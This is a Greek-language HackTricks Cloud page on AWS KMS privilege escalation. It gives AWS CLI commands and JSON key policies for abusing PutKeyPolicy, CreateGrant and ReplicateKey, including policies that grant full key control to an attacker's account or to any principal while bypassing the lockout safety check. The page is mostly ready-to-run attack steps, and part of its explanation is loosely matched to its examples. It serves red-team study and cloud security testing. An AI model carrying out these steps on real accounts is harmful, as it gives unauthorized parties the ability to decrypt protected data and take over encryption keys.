# AWS - KMS Privesc

{% hint style="success" %}
Μάθετε και εξασκηθείτε στο AWS Hacking:<img src="/.gitbook/assets/image.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/image.png" alt="" data-size="line">\
Μάθετε και εξασκηθείτε στο GCP Hacking: <img src="/.gitbook/assets/image (2).png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/image (2).png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Υποστηρίξτε το HackTricks</summary>

* Ελέγξτε τα [**σχέδια συνδρομής**](https://github.com/sponsors/carlospolop)!
* **Γίνετε μέλος της** 💬 [**ομάδας Discord**](https://discord.gg/hRep4RUj7f) ή της [**ομάδας telegram**](https://t.me/peass) ή **ακολουθήστε** μας στο **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Μοιραστείτε hacking tricks υποβάλλοντας PRs στα** [**HackTricks**](https://github.com/carlospolop/hacktricks) και [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) αποθετήρια στο github.

</details>
{% endhint %}

## KMS

Για περισσότερες πληροφορίες σχετικά με το KMS ελέγξτε:

{% content-ref url="../aws-services/aws-kms-enum.md" %}
[aws-kms-enum.md](../aws-services/aws-kms-enum.md)
{% endcontent-ref %}

### `kms:ListKeys`,`kms:PutKeyPolicy`, (`kms:ListKeyPolicies`, `kms:GetKeyPolicy`)

Με αυτές τις άδειες είναι δυνατόν να **τροποποιηθούν τα δικαιώματα πρόσβασης στο κλειδί** ώστε να μπορεί να χρησιμοποιηθεί από άλλους λογαριασμούς ή ακόμα και από οποιονδήποτε:

{% code overflow="wrap" %}
```bash
aws kms list-keys
aws kms list-key-policies --key-id <id> # Although only 1 max per key
aws kms get-key-policy --key-id <id> --policy-name <policy_name>
# AWS KMS keys can only have 1 policy, so you need to use the same name to overwrite the policy (the name is usually "default")
aws kms put-key-policy --key-id <id> --policy-name <policy_name> --policy file:///tmp/policy.json
```
{% endcode %}

policy.json:

```json
{
    "Version": "2012-10-17",
    "Statement": [
        {
            "Effect": "Allow",
            "Action": "kms:CreateKey",
            "Resource": "*"
        },
        {
            "Effect": "Allow",
            "Action": [
                "kms:CreateAlias",
                "kms:UpdateAlias"
            ],
            "Resource": "*"
        },
        {
            "Effect": "Allow",
            "Action": "kms:PutKeyPolicy",
            "Resource": "*"
        }
    ]
}
```

Αυτή η πολιτική επιτρέπει τη δημιουργία ενός νέου KMS key, τη δημιουργία και ενημέρωση ενός alias για το key, και την τοποθέτηση μιας πολιτικής στο key. Με αυτές τις άδειες, ένας επιτιθέμενος μπορεί να δημιουργήσει ένα νέο key, να τοποθετήσει μια πολιτική που του δίνει πλήρη έλεγχο στο key, και να χρησιμοποιήσει το key για να αποκρυπτογραφήσει δεδομένα ή να υπογράψει μηνύματα.

### Δημιουργία ενός νέου KMS key

```sh
aws kms create-key --description "My new key"
```

Αυτό θα δημιουργήσει ένα νέο KMS key και θα επιστρέψει το KeyId του.

### Δημιουργία ενός alias για το νέο key

```sh
aws kms create-alias --alias-name alias/my-new-key --target-key-id <KeyId>
```

Αυτό θα δημιουργήσει ένα alias για το νέο key, κάνοντας το πιο εύκολο στη χρήση.

### Τοποθέτηση μιας πολιτικής στο νέο key

```sh
aws kms put-key-policy --key-id <KeyId> --policy file://policy.json
```

Αυτό θα τοποθετήσει την πολιτική που ορίζεται στο αρχείο policy.json στο νέο key, δίνοντας πλήρη έλεγχο στον επιτιθέμενο.
```json
{
"Version" : "2012-10-17",
"Id" : "key-consolepolicy-3",
"Statement" : [
{
"Sid" : "Enable IAM User Permissions",
"Effect" : "Allow",
"Principal" : {
"AWS" : "arn:aws:iam::<origin_account>:root"
},
"Action" : "kms:*",
"Resource" : "*"
},
{
"Sid" : "Allow all use",
"Effect" : "Allow",
"Principal" : {
"AWS" : "arn:aws:iam::<attackers_account>:root"
},
"Action" : [ "kms:*" ],
"Resource" : "*"
}
]
}
```
### `kms:CreateGrant`

Επιτρέπει σε έναν principal να χρησιμοποιήσει ένα KMS key:
```bash
aws kms create-grant \
--key-id 1234abcd-12ab-34cd-56ef-1234567890ab \
--grantee-principal arn:aws:iam::123456789012:user/exampleUser \
--operations Decrypt
```
{% hint style="warning" %}
Ένα grant μπορεί να επιτρέψει μόνο συγκεκριμένους τύπους λειτουργιών: [https://docs.aws.amazon.com/kms/latest/developerguide/grants.html#terms-grant-operations](https://docs.aws.amazon.com/kms/latest/developerguide/grants.html#terms-grant-operations)
{% endhint %}

{% hint style="warning" %}
Σημειώστε ότι μπορεί να χρειαστούν μερικά λεπτά για να **επιτρέψει το KMS στον χρήστη να χρησιμοποιήσει το κλειδί μετά τη δημιουργία του grant**. Μόλις περάσει αυτός ο χρόνος, ο principal μπορεί να χρησιμοποιήσει το KMS key χωρίς να χρειάζεται να καθορίσει τίποτα.\
Ωστόσο, αν χρειάζεται να χρησιμοποιηθεί το grant αμέσως [χρησιμοποιήστε ένα grant token](https://docs.aws.amazon.com/kms/latest/developerguide/grant-manage.html#using-grant-token) (ελέγξτε τον ακόλουθο κώδικα).\
Για [**περισσότερες πληροφορίες διαβάστε αυτό**](https://docs.aws.amazon.com/kms/latest/developerguide/grant-manage.html#using-grant-token).
{% endhint %}
```bash
# Use the grant token in a request
aws kms generate-data-key \
--key-id 1234abcd-12ab-34cd-56ef-1234567890ab \
–-key-spec AES_256 \
--grant-tokens $token
```
Σημειώστε ότι είναι δυνατό να παραθέσετε τις επιχορηγήσεις των κλειδιών με:
```bash
aws kms list-grants --key-id <value>
```
### `kms:CreateKey`, `kms:ReplicateKey`

Με αυτές τις άδειες είναι δυνατό να αναπαραχθεί ένα multi-region enabled KMS key σε διαφορετική περιοχή με διαφορετική πολιτική.

Έτσι, ένας επιτιθέμενος θα μπορούσε να εκμεταλλευτεί αυτό για να αποκτήσει privesc την πρόσβασή του στο κλειδί και να το χρησιμοποιήσει

{% code overflow="wrap" %}
```bash
aws kms replicate-key --key-id mrk-c10357313a644d69b4b28b88523ef20c --replica-region eu-west-3 --bypass-policy-lockout-safety-check --policy file:///tmp/policy.yml

{
"Version": "2012-10-17",
"Id": "key-consolepolicy-3",
"Statement": [
{
"Sid": "Enable IAM User Permissions",
"Effect": "Allow",
"Principal": {
"AWS": "*"
},
"Action": "kms:*",
"Resource": "*"
}
]
}
```
{% endcode %}

### `kms:Decrypt`

Αυτή η άδεια επιτρέπει τη χρήση ενός κλειδιού για την αποκρυπτογράφηση κάποιων πληροφοριών.\
Για περισσότερες πληροφορίες, ελέγξτε:

{% content-ref url="../aws-post-exploitation/aws-kms-post-exploitation.md" %}
[aws-kms-post-exploitation.md](../aws-post-exploitation/aws-kms-post-exploitation.md)
{% endcontent-ref %}

{% hint style="success" %}
Μάθετε και εξασκηθείτε στο AWS Hacking:<img src="/.gitbook/assets/image.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/image.png" alt="" data-size="line">\
Μάθετε και εξασκηθείτε στο GCP Hacking: <img src="/.gitbook/assets/image (2).png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/image (2).png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Υποστηρίξτε το HackTricks</summary>

* Ελέγξτε τα [**σχέδια συνδρομής**](https://github.com/sponsors/carlospolop)!
* **Συμμετάσχετε στην** 💬 [**ομάδα Discord**](https://discord.gg/hRep4RUj7f) ή στην [**ομάδα telegram**](https://t.me/peass) ή **ακολουθήστε** μας στο **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Μοιραστείτε hacking tricks υποβάλλοντας PRs στα** [**HackTricks**](https://github.com/carlospolop/hacktricks) και [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) αποθετήρια στο github.

</details>
{% endhint %}
